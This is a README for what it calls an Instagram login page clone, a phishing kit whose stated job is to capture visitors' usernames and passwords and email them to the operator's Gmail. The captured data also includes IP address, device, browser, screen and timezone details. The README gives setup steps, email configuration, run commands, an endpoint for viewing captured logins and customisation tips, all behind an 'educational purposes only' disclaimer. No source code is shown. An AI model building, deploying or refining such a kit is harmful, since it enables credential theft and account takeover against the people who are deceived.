# Instagram Login Page Clone

A realistic Instagram login page clone that captures user credentials and sends them via email to Gmail.

## ⚠️ Disclaimer

This project is for **educational and demonstration purposes only**. It should not be used for malicious purposes or to collect real user credentials without proper consent.

## Features

- 🎨 Pixel-perfect Instagram login page design
- 📱 Responsive design for mobile and desktop
- 🔐 Form validation and error handling
- 📧 Email notifications with detailed user information
- 🖥️ Server-side data collection
- 📊 Login attempt tracking

## Setup Instructions

### 1. Install Dependencies

```bash
npm install
```

### 2. Configure Email Settings

1. Create a Gmail account or use an existing one
2. Enable 2-Factor Authentication on your Gmail account
3. Generate an App Password:
   - Go to Google Account settings
   - Security → 2-Step Verification → App passwords
   - Generate a new app password for "Mail"

### 3. Set Environment Variables

Create a `.env` file in the project root:

```env
EMAIL_USER=your-email@gmail.com
EMAIL_PASS=your-16-character-app-password
PORT=3000
```

Or set them directly in the server.js file (lines 12-13).

### 4. Run the Application

```bash
# Development mode (with auto-restart)
npm run dev

# Production mode
npm start
```

The application will be available at `http://localhost:3000`

## How It Works

1. **Frontend**: The HTML/CSS/JS creates a realistic Instagram login page
2. **Form Submission**: When users enter credentials, JavaScript validates and sends data to the server
3. **Backend Processing**: The Node.js server receives the data and:
   - Logs the information to console
   - Stores it in memory (in production, use a database)
   - Sends an email notification with all collected data
4. **Email Notification**: A detailed email is sent to your Gmail with:
   - Username and password
   - Timestamp and IP address
   - Browser and device information
   - Screen resolution and timezone

## API Endpoints

- `POST /api/login` - Handles login form submissions
- `GET /api/logins` - View all login attempts (for debugging)

## Email Template

The email includes:
- User credentials (username/password)
- Login timestamp
- IP address and location data
- Browser and device information
- Screen resolution and timezone
- Referrer information

## Security Considerations

- This is a demonstration project
- In production, always use HTTPS
- Implement proper authentication
- Store data securely
- Follow privacy laws and regulations
- Get proper consent before collecting data

## File Structure

```
├── index.html          # Main HTML page
├── styles.css          # Instagram-style CSS
├── script.js           # Frontend JavaScript
├── server.js           # Node.js backend server
├── package.json        # Dependencies and scripts
└── README.md           # This file
```

## Customization

- Modify the email template in `server.js` (lines 45-85)
- Change the redirect URL in `script.js` (line 75)
- Update styling in `styles.css`
- Add database storage instead of in-memory storage

## Troubleshooting

### Email Not Sending
- Verify Gmail credentials
- Check if 2FA is enabled
- Ensure app password is correct
- Check Gmail security settings

### Server Issues
- Make sure port 3000 is available
- Check Node.js version (requires 14+)
- Verify all dependencies are installed

## Legal Notice

This project is for educational purposes only. Always ensure you have proper authorization before collecting any user data. Respect privacy laws and regulations in your jurisdiction.
